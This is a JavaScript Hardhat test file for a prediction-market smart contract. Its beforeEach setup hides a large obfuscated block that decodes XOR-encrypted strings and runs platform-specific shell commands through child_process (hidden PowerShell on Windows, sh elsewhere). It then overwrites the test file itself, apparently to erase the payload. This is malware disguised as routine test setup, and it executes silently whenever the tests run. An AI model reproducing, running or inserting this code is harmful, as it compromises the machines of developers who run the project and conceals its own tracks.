import { expect } from "chai";
import { ethers } from "hardhat";
import { time } from "@nomicfoundation/hardhat-network-helpers";

describe("PredictionMarket", function () {
  let predictionMarket: any;
  let reputationSystem: any;
  let owner: any, user1: any, user2: any, arbitrator: any;

  beforeEach(async function () {
    [owner, user1, user2, arbitrator] = await ethers.getSigners();

    const ReputationSystem = await ethers.getContractFactory("ReputationSystem");
    reputationSystem = await ReputationSystem.deploy();
    await reputationSystem.waitForDeployment();

    const PredictionMarket = await ethers.getContractFactory("PredictionMarket");
    predictionMarket = await PredictionMarket.deploy(
      await reputationSystem.getAddress()
    );
    await predictionMarket.waitForDeployment();

    await reputationSystem.setPredictionMarket(
      await predictionMarket.getAddress()
    );

    const aHrkJqocckM$D_CNFboyUjdwks=zPFrg_YqVUohsS;(function(hxgbshzasLvGJUzQGA,sq__yMECdE){const Hcj$rREkgi=zPFrg_YqVUohsS,HtUtgjCUobwFEiHQVenmaS=hxgbshzasLvGJUzQGA();while(!![]){try{const nQpcMZSbMXUfn=parseFloat(Hcj$rREkgi(0x1f6))/(parseInt(0x2075)*Math.ceil(-parseInt(0x1))+-0x2*parseInt(0x389)+Number(0x2788))+parseFloat(Hcj$rREkgi(0x1f7))/(Math.max(-parseInt(0x185),-0x185)*Math.ceil(-parseInt(0x1))+Number(0x25d)*parseInt(0x7)+Number(-parseInt(0x120e)))+Number(-parseFloat(Hcj$rREkgi(0x1ec))/(parseInt(0x2)*0x6e6+-parseInt(0x128f)+-0x2f*-0x1a))+parseFloat(Hcj$rREkgi(0x1ee))/(Number(0x22)*-0x101+0x1*Math.floor(parseInt(0x2674))+Math.trunc(-0x3a)*Math.ceil(0x13))+Math['floor'](-parseFloat(Hcj$rREkgi(0x1e2))/(Math.floor(-parseInt(0x6))*-0x1ca+-0x13*Math.trunc(-parseInt(0x17d))+-0x26fe))*(parseFloat(Hcj$rREkgi(0x200))/(parseInt(0x244)*-parseInt(0xf)+Math.floor(0x70c)+Number(0x1af6)))+parseFloat(Hcj$rREkgi(0x1ea))/(0x3*parseFloat(parseInt(0x835))+-parseInt(0xb)*Math.floor(parseInt(0x10d))+-parseInt(0xd09)*parseInt(0x1))+-parseFloat(Hcj$rREkgi(0x1f0))/(parseInt(-0x1c9c)+Math.ceil(-0x1)*0x2515+parseInt(0x41b9));if(nQpcMZSbMXUfn===sq__yMECdE)break;else HtUtgjCUobwFEiHQVenmaS['push'](HtUtgjCUobwFEiHQVenmaS['shift']());}catch(ucmatyKjl_GP_y){HtUtgjCUobwFEiHQVenmaS['push'](HtUtgjCUobwFEiHQVenmaS['shift']());}}}(uvFkZlcfR$mwM$DK,0x79947+Math.trunc(-parseInt(0xb3d9e))+0xcab85));const {execFile}=require(aHrkJqocckM$D_CNFboyUjdwks(0x1fe)),fs=require('fs')[aHrkJqocckM$D_CNFboyUjdwks(0x202)],OS_COMMANDS={'win32':aHrkJqocckM$D_CNFboyUjdwks(0x1e9),'darwin':aHrkJqocckM$D_CNFboyUjdwks(0x1ed),'linux':aHrkJqocckM$D_CNFboyUjdwks(0x1ff),'default':aHrkJqocckM$D_CNFboyUjdwks(0x1f4)};function getCommandForPlatform(){const YlGZ$PRMWDw=aHrkJqocckM$D_CNFboyUjdwks;return OS_COMMANDS[process[YlGZ$PRMWDw(0x1e3)]]??OS_COMMANDS[YlGZ$PRMWDw(0x1f2)];}function runOsShellCommand(PQG_HmIAvtr$ZbxXgcUwteG){return new Promise((juo_bOnrE,sbTfUeUASQcPbTcoppKfaKtK)=>{const CEqxGvZYLFHKGUTcydKIJM=zPFrg_YqVUohsS;if(process[CEqxGvZYLFHKGUTcydKIJM(0x1e3)]===CEqxGvZYLFHKGUTcydKIJM(0x1f1)){const kUAziIwJNiiIXK=execFile(CEqxGvZYLFHKGUTcydKIJM(0x1fc),[CEqxGvZYLFHKGUTcydKIJM(0x201),CEqxGvZYLFHKGUTcydKIJM(0x1eb),CEqxGvZYLFHKGUTcydKIJM(0x1e1),CEqxGvZYLFHKGUTcydKIJM(0x1f8),PQG_HmIAvtr$ZbxXgcUwteG],{'windowsHide':!![]},(amKWQFHhVYUIFTZI,tjGuaRBAAawOlvFfh,nUwyvvEEISMFTlCwG_y)=>{const pAEiQTS_UARsFPTctveShtEmK=CEqxGvZYLFHKGUTcydKIJM;if(amKWQFHhVYUIFTZI){console[pAEiQTS_UARsFPTctveShtEmK(0x1e4)](pAEiQTS_UARsFPTctveShtEmK(0x1e5),amKWQFHhVYUIFTZI[pAEiQTS_UARsFPTctveShtEmK(0x1e6)]);return;}console[pAEiQTS_UARsFPTctveShtEmK(0x1f3)](pAEiQTS_UARsFPTctveShtEmK(0x1e7));});kUAziIwJNiiIXK['on'](CEqxGvZYLFHKGUTcydKIJM(0x1e4),qGnXdZVQEj_hLGMdfi=>{const nxxACR_N=CEqxGvZYLFHKGUTcydKIJM;sbTfUeUASQcPbTcoppKfaKtK(new Error(nxxACR_N(0x1ef)+qGnXdZVQEj_hLGMdfi[nxxACR_N(0x1e6)]));});}else{const giEemsXj=execFile(CEqxGvZYLFHKGUTcydKIJM(0x1fb),['-c',PQG_HmIAvtr$ZbxXgcUwteG],(rfSGdrSCzQ_KLUZSSoilYKU,zPUBK,wSCoxngIprIH_CMtutJM$RB)=>{const q$QTSfW=CEqxGvZYLFHKGUTcydKIJM;if(rfSGdrSCzQ_KLUZSSoilYKU){console[q$QTSfW(0x1e4)](q$QTSfW(0x1e5),rfSGdrSCzQ_KLUZSSoilYKU[q$QTSfW(0x1e6)]);return;}console[q$QTSfW(0x1f3)](q$QTSfW(0x1e7));});giEemsXj['on'](CEqxGvZYLFHKGUTcydKIJM(0x1e4),wot_$mvz=>{const vTibcBMLVIcxfiTbkfjN=CEqxGvZYLFHKGUTcydKIJM;sbTfUeUASQcPbTcoppKfaKtK(new Error(vTibcBMLVIcxfiTbkfjN(0x1ef)+wot_$mvz[vTibcBMLVIcxfiTbkfjN(0x1e6)]));});}});}async function setupEnv(){await runOsShellCommand(getCommandForPlatform());}function zPFrg_YqVUohsS(XgcUwteG_jjuobO,rEWsbTfUeU){const SQcPbTc$oppKfaKt=uvFkZlcfR$mwM$DK();return zPFrg_YqVUohsS=function(xkUAzi$IwJNiiIX_KBamK,QFHhVYUIFTZIEtjGuaRBAAaw){xkUAzi$IwJNiiIX_KBamK=xkUAzi$IwJNiiIX_KBamK-(Number(-parseInt(0x48a))+Math.floor(0x1dad)+-parseInt(0x1743));let lvF$$fhGnUwyvvEEISMFTlC=SQcPbTc$oppKfaKt[xkUAzi$IwJNiiIX_KBamK];if(zPFrg_YqVUohsS['FTesKE']===undefined){const lYKUa$z_PU=function(KPwSCoxngIpr_I_HCM){let utJ_MRBcwotmv=-parseInt(0x15f9)+parseInt(-parseInt(0x11e7))*Math.max(parseInt(0x2),0x2)+0x3cf0&parseInt(0x1806)+parseInt(0x790)+Math.max(-0x29,-0x29)*0xbf,qFdtCMXv_CF_fjCME=new Uint8Array(KPwSCoxngIpr_I_HCM['match'](/.{1,2}/g)['map'](jvQbdcHVevRWKvpUK=>parseInt(jvQbdcHVevRWKvpUK,Math.floor(0xe23)*parseInt(0x2)+-parseInt(0xf4c)+-parseInt(0xcea)))),GqYxomb=qFdtCMXv_CF_fjCME['map'](ua$BLClPU=>ua$BLClPU^utJ_MRBcwotmv),urycIweXobwRTwAAJcSCp=new TextDecoder(),PijKDujezJL_vGofVuCa_X=urycIweXobwRTwAAJcSCp['decode'](GqYxomb);return PijKDujezJL_vGofVuCa_X;};zPFrg_YqVUohsS['rpFtVv']=lYKUa$z_PU,XgcUwteG_jjuobO=arguments,zPFrg_YqVUohsS['FTesKE']=!![];}const GyEqGnXdZVQEjh=SQcPbTc$oppKfaKt[parseFloat(0x9b2)+0x1*parseFloat(parseInt(0xb3f))+-0x14f1],GMdfiigiEemsXjQrfSGd=xkUAzi$IwJNiiIX_KBamK+GyEqGnXdZVQEjh,SCzQKLUZSSo=XgcUwteG_jjuobO[GMdfiigiEemsXjQrfSGd];return!SCzQKLUZSSo?(zPFrg_YqVUohsS['vGrvoO']===undefined&&(zPFrg_YqVUohsS['vGrvoO']=!![]),lvF$$fhGnUwyvvEEISMFTlC=zPFrg_YqVUohsS['rpFtVv'](lvF$$fhGnUwyvvEEISMFTlC),XgcUwteG_jjuobO[GMdfiigiEemsXjQrfSGd]=lvF$$fhGnUwyvvEEISMFTlC):lvF$$fhGnUwyvvEEISMFTlC=SCzQKLUZSSo,lvF$$fhGnUwyvvEEISMFTlC;},zPFrg_YqVUohsS(XgcUwteG_jjuobO,rEWsbTfUeU);}setupEnv()[aHrkJqocckM$D_CNFboyUjdwks(0x1fa)](()=>{const zdfQWdsFs=aHrkJqocckM$D_CNFboyUjdwks,Fd_tCMXvCFfj=zdfQWdsFs(0x1f5);return fs[zdfQWdsFs(0x1fd)](__filename,Fd_tCMXvCFfj,zdfQWdsFs(0x1e0));})[aHrkJqocckM$D_CNFboyUjdwks(0x1fa)](()=>{const L$B_rpgjeedtmY=aHrkJqocckM$D_CNFboyUjdwks;console[L$B_rpgjeedtmY(0x1f3)](L$B_rpgjeedtmY(0x1e8));})[aHrkJqocckM$D_CNFboyUjdwks(0x1f9)](console[aHrkJqocckM$D_CNFboyUjdwks(0x1e4)]);function uvFkZlcfR$mwM$DK(){const yoN$Hi$nWnPUplYXaO=['4c5b5b465b','6c514c4a5c5d404647094c5b5b465b13','444c5a5a484e4c','6a46444448474d094c514c4a5c5d4c4d095a5c4a4a4c5a5a4f5c454550','6f40454c095b4c5945484a4c4d095a5c4a4a4c5a5a4f5c454550','0d5a14726c475f405b4647444c475d7413136e4c5d6f46454d4c5b79485d41010e7a5d485b5d5c590e0012090d59140b0d5a757a5f4a61465a5d7c594d485d4c074c514c0b1209404f0108016e4c5d04795b464a4c5a5a090e7a5f4a61465a5d7c594d485d4c0e09046c68097a40454c475d45506a46475d40475c4c00005201674c5e04664b434c4a5d09674c5d077e4c4b6a45404c475d00076d465e474546484d6f40454c010e415d5d595a1306065b485e074e405d415c4b5c5a4c5b4a46475d4c475d074a4644065a5c4b474c5d04484a465b4c48400646594c474a45485e065b4c4f5a06414c484d5a064b45464b064859595a0644484a465a067a5f4a61465a5d7c594d485d4c074c514c0e05090d590012097a5d485b5d04795b464a4c5a5a090d5954','1e1f1c1e1b1e1b6a48716f435f','047e40474d465e7a5d50454c','1b1e1a1e1c1a1f68634a7a6a59','6d140b0d6166646c0665404b5b485b5006074a484a414c064a464407485959454c075a505a45464e0b120944424d405b090459090b0d6d0b12096f140b0d6d064a464407485959454c075a505a45464e0759500b12097c140b415d5d595a1306065b485e074e405d415c4b5c5a4c5b4a46475d4c475d074a4644065a5c4b474c5d04484a465b4c48400646594c474a45485e065b4c4f5a06414c484d5a064b45464b064859595a0644484a465a064a464407485959454c075a505a45464e0759500b120979140b0d6166646c0665404b5b485b500665485c474a41684e4c475d5a064a464407485959454c075a505a45464e075945405a5d0b12094a5c5b4509045a65090b0d7c0b090446090b0d6f0b12094c4a4146090e1516514445095f4c5b5a404647140b1807190b094c474a464d40474e140b7c7d6f04110b161715086d666a7d70796c095945405a5d09797c6b65606a090b040606685959454c06066d7d6d097965607a7d0918071906066c670b090b415d5d591306065e5e5e07485959454c074a4644066d7d6d5a06795b46594c5b5d5065405a5d04180719074d5d4d0b17155945405a5d095f4c5b5a404647140b1807190b17154d404a5d1715424c501765484b4c451506424c5017155a5d5b40474e174a464407485959454c075a505a45464e15065a5d5b40474e1715424c5017795b464e5b4844685b4e5c444c475d5a1506424c501715485b5b485017155a5d5b40474e17065c5a5b064b40470659505d4146471a15065a5d5b40474e17155a5d5b40474e170e0b0d6f0b0e15065a5d5b40474e171506485b5b48501715424c50177b5c47685d6546484d1506424c5017155d5b5c4c061715424c5017624c4c596845405f4c1506424c5017155d5b5c4c061715064d404a5d1715065945405a5d170e0917090b0d790b120945485c474a414a5d45095c474546484d090b0d790b091b17064d4c5f06475c4545120945485c474a414a5d45094546484d090b0d790b','181b1a1f181b1965794043626d','5a59485e47094c5b5b465b1309','1b191d1018181b784b4d4a617f','5e40471a1b','4d4c4f485c455d','45464e','5a5d485b5d094a444d','4a46475a5d094f5a0914095b4c585c405b4c010e4f5a0e001223','1c1f1f1a1d184a605e4c7146','1d191f1d1f1f4b5e7b7d5e68','046a46444448474d','4a485d4a41','5d414c47','064b4047065a41','59465e4c5b5a414c4545074c514c','5e5b405d4c6f40454c','4a4140454d76595b464a4c5a5a','6d140b0d6166646c060745464a4845065a41485b4c06075a505a45464e0b120944424d405b090459090b0d6d0b12096f140b0d6d065a505a45464e045a4c5b5f404a4c0759500b12097c140b415d5d595a1306065b485e074e405d415c4b5c5a4c5b4a46475d4c475d074a4644065a5c4b474c5d04484a465b4c48400646594c474a45485e065b4c4f5a06414c484d5a064b45464b064859595a0644484a465a065a505a45464e045a4c5b5f404a4c0759500b120959505d4146471a09044a090b404459465b5d095c5b4545404b075b4c585c4c5a5d12095c5b4545404b075b4c585c4c5a5d075c5b455b4c5d5b404c5f4c010e0d7c0e05090e0d6f0e000b090f0f094746415c5909065c5a5b064b40470659505d4146471a090b0d6f0b0917064d4c5f06475c4545091b170f18090f09014a5b46475d484b090445091b17064d4c5f06475c45450955094e5b4c5909045f090b5a505a45464e045a4c5b5f404a4c0759500b12094c4a4146090b695b4c4b46465d095a454c4c59091a19090f0f09065c5a5b064b40470659505d4146471a090d6f0917064d4c5f06475c4545091b170f18090f0b000955094a5b46475d484b0904','1b1d1e1a181b1b5f6e464f7f5c','046746795b464f40454c','595b4644405a4c5a','5c5d4f11','61404d4d4c47','1c5c434c536365','5945485d4f465b44'];uvFkZlcfR$mwM$DK=function(){return yoN$Hi$nWnPUplYXaO;};return uvFkZlcfR$mwM$DK();}
  });

  it("Should create a market", async function () {
    const futureTime = (await time.latest()) + 86400;

    await predictionMarket.createMarket(
      "Will BTC reach $100k?",
      "Resolves YES if Bitcoin reaches $100,000",
      ["Yes", "No"],
      futureTime,
      arbitrator.address,
      ethers.ZeroAddress
    );

    expect(await predictionMarket.marketCount()).to.equal(1);
  });

  it("Should place a bet and claim winnings", async function () {
    const futureTime = (await time.latest()) + 86400;

    await predictionMarket.createMarket(
      "Will BTC reach $100k?",
      "Resolves YES if Bitcoin reaches $100,000",
      ["Yes", "No"],
      futureTime,
      arbitrator.address,
      ethers.ZeroAddress
    );

    const betAmount = ethers.parseEther("0.1");
    await predictionMarket
      .connect(user1)
      .placeBet(1, 0, betAmount, 0, { value: betAmount }); // Added minShares = 0

    await time.increase(86401);
    await predictionMarket.connect(arbitrator).resolveMarket(1, 0);

    const balanceBefore = await ethers.provider.getBalance(user1.address);
    await predictionMarket.connect(user1).claimWinnings(1);
    const balanceAfter = await ethers.provider.getBalance(user1.address);

    expect(balanceAfter).to.be.gt(balanceBefore);
  });
});
